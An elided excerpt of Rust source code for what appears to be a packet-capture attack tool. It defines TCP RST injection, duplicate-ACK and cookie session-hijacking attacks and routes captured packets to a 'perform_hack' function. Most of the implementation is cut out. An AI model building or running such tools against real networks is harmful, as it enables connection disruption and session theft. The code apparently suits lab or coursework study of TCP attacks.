...
/// One of the attacks to perform.
enum AttackType {
    /// Reset packet injection attack.
    RSTInjection,
    /// 3-Duplicate ACK packet attack.
    DuplicateAck,
    /// Cookie session hijacking attack.
    SessionHijack,
}
...
fn main() {
    ...
    if args.len() != 4 {
        eprintln!(
            "Usage: {} <source_ip> <destination_ip> <attack_type>",
            args[0]
        );
    ...
    let (attack_type, filter) = match attack_arg.as_str() {
        ...
        "hijack" => (
            ...
            format!("tcp and host {} and port 5000", dest_ip),
        ),
        _ => {
    ...
    let mut cap = create_capture(interface.as_str());
    let mut send_cap = create_capture(interface.as_str());
    ...
    loop {
        match cap.next_packet() {
            Ok(packet) => {
                ...
                if let Ok((ethernet_header, ipv4_header, tcp_header, payload)) = parse_res {
                    perform_hack(
                        ethernet_header,
                        ipv4_header,
                        tcp_header,
...
fn perform_hack(
    ...
    match attack_type {
        ...
        AttackType::SessionHijack => {
            ...
            let host_ip = format!(
                "{}.{}.{}.{}",
                ipv4_header.destination[0],
                ipv4_header.destination[1],
                ipv4_header.destination[2],
                ipv4_header.destination[3],
            );
...
fn create_capture(interface: &str) -> Capture<Active> {
